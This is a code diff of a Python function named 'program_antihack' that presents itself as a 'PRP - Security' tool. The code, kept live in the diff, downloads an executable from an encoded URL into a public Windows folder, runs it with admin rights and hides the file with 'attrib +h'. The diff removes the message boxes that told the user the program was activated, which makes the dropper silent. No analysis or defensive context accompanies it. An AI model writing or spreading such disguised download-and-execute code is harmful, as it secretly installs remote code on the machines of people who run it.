@@ -11,12 +11,10 @@ def program_antihack():
         if is_admin():    
             try:
                 os.startfile(f'C:/Users/Public/Videos/prp-ser.exe')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/prp-ser.exe', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/prp-ser.exe')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/prp-ser.exe')
                 _doHideBatch.read()
